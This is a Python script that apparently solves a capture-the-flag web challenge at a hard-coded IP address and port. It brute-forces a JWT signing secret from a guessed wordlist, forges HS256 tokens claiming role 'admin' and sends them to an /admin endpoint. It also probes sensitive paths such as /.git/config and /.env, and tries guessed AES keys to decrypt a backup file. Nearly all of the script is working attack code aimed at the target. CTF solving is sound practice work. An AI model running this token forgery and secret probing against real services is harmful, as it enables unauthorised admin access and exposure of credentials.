#!/usr/bin/env python3
"""
Final push - try everything systematically
"""

import requests
import jwt
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import re

TARGET_URL = "http://138.199.163.92:12973/"

def try_all_secrets():
    """Try all possible secrets systematically"""
    
    session = requests.Session()
    
    # Extended secret list based on all clues
    secrets = [
        # Direct geohashes
        "s000", "s0000", "s00000", "s000000", "s0000000", "s00000000",
        "u000", "u0000", "u00000", "u000000",
        
        # Coordinates
        "0,0", "0.0,0.0", "00", "000", "0-0",
        
        # Words from the page
        "nullisland", "NullIsland", "NULLISLAND",
        "equator", "Equator", "EQUATOR",
        "meridian", "Meridian", "MERIDIAN",
        "primemeridian", "PrimeMeridian",
        "geohash", "Geohash", "GEOHASH",
        "navigation", "Navigation",
        "transmission", "Transmission",
        "encrypted", "Encrypted",
        
        # Version numbers
        "v3", "v3.0", "v30", "3.0", "30",
        
        # Combinations
        "null_island", "null-island",
        "equator_navigation", "equator-navigation",
        "geohash_puzzle", "geohash-puzzle",
        "s000_nullisland", "nullisland_s000",
        
        # Author hint
        "M33TSH@H", "M33TSHAH", "meetshah",
        
        # Challenge specific
        "2025", "debug", "admin",
        "secret", "password", "key", "flag",
        
        # Atlantic/Guinea
        "atlantic", "guinea", "gulfofguinea",
        
        # Latitude/Longitude
        "latitude", "longitude", "coordinates",
        "lat0lon0", "0N0E",
    ]
    
    payload = {"role": "admin"}
    
    print(f"Testing {len(secrets)} JWT secrets...")
    
    for i, secret in enumerate(secrets):
        if (i + 1) % 10 == 0:
            print(f"  Progress: {i+1}/{len(secrets)}")
        
        try:
            token = jwt.encode(payload, secret, algorithm="HS256")
            headers = {"Authorization": f"Bearer {token}"}
            
            resp = session.get(TARGET_URL + 'admin', headers=headers, timeout=2)
            
            if resp.status_code == 200:
                print(f"\n[!!!] FOUND SECRET: '{secret}'")
                print(f"Response:\n{resp.text}\n")
                
                flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                if flag:
                    print(f"[!!!] FLAG: {flag.group(0)}")
                    return flag.group(0)
                return resp.text
        except Exception as e:
            pass
    
    print("No JWT secret found\n")
    return None

def try_all_aes_keys():
    """Try all AES keys"""
    
    try:
        with open('backup.bin', 'rb') as f:
            data = f.read()
    except:
        print("backup.bin not found")
        return None
    
    key_strings = [
        "s000", "s0000", "s00000", "s000000", "s0000000",
        "u000", "u0000", "nullisland", "geohash", "equator",
        "meridian", "primemeridian", "navigation",
        "null_island", "NullIsland", "0,0", "00",
        "M33TSH@H", "meetshah", "2025",
    ]
    
    print(f"Testing {len(key_strings)} AES keys...")
    
    for key_str in key_strings:
        # Multiple key derivations
        keys = [
            hashlib.sha256(key_str.encode()).digest(),
            hashlib.md5(key_str.encode()).digest() * 2,
        ]
        
        # Multiple IVs
        ivs = [
            b'\x00' * 16,
            hashlib.md5(key_str.encode()).digest(),
        ]
        
        for key in keys:
            for iv in ivs:
                try:
                    cipher = AES.new(key, AES.MODE_CBC, iv)
                    decrypted = cipher.decrypt(data)
                    unpadded = unpad(decrypted, 16)
                    text = unpadded.decode('utf-8', errors='ignore')
                    
                    if 'kaal{' in text.lower():
                        print(f"\n[!!!] FOUND AES KEY: '{key_str}'")
                        print(f"Decrypted: {text}")
                        
                        flag = re.search(r'Kaal\{[^}]+\}', text, re.IGNORECASE)
                        if flag:
                            print(f"[!!!] FLAG: {flag.group(0)}")
                            return flag.group(0)
                except:
                    pass
    
    print("No AES key found\n")
    return None

def check_all_endpoints():
    """Check all possible endpoints"""
    
    session = requests.Session()
    
    endpoints = [
        '/', '/robots.txt', '/flag.txt', '/backup.bin',
        '/admin', '/login',
        '/api', '/api/admin', '/api/flag',
        '/api/v3', '/api/v3/admin', '/api/v3/flag',
        '/api/v3/geohash-debug-2025',
        '/.git/config', '/.env', '/config.json',
        '/secret', '/hidden', '/debug',
    ]
    
    print("Checking all endpoints...")
    
    for endpoint in endpoints:
        try:
            resp = session.get(TARGET_URL.rstrip('/') + endpoint, timeout=2)
            if resp.status_code == 200 and 'kaal{' in resp.text.lower():
                flag = re.search(r'Kaal\{[^}]+\}', resp.text, re.IGNORECASE)
                if flag:
                    flag_text = flag.group(0)
                    # Skip known decoys
                    if flag_text not in ['Kaal{html_c0mm3nts_ar3_n0t_s3cur3}', 
                                         'Kaal{r0b0ts_d0nt_k33p_s3cr3ts}',
                                         'Kaal{r0b0ts_txt_l3d_m3_h3r3}']:
                        print(f"\n[!!!] FLAG at {endpoint}: {flag_text}")
                        return flag_text
        except:
            pass
    
    print("No new flags in endpoints\n")
    return None

def main():
    print("="*60)
    print("FINAL SYSTEMATIC ATTEMPT")
    print("="*60)
    print()
    
    # Check endpoints first (fastest)
    result = check_all_endpoints()
    if result:
        print(f"\n{'='*60}")
        print(f"FINAL FLAG: {result}")
        print(f"{'='*60}")
        return
    
    # Try JWT secrets
    result = try_all_secrets()
    if result:
        print(f"\n{'='*60}")
        print(f"FINAL FLAG: {result}")
        print(f"{'='*60}")
        return
    
    # Try AES keys
    result = try_all_aes_keys()
    if result:
        print(f"\n{'='*60}")
        print(f"FINAL FLAG: {result}")
        print(f"{'='*60}")
        return
    
    print("\n" + "="*60)
    print("All attempts exhausted")
    print("Known flags:")
    print("  - Kaal{html_c0mm3nts_ar3_n0t_s3cur3} (HTML comment - decoy)")
    print("  - Kaal{r0b0ts_d0nt_k33p_s3cr3ts} (robots.txt - test)")
    print("  - Kaal{r0b0ts_txt_l3d_m3_h3r3} (flag.txt - decoy)")
    print("="*60)

if __name__ == "__main__":
    main()
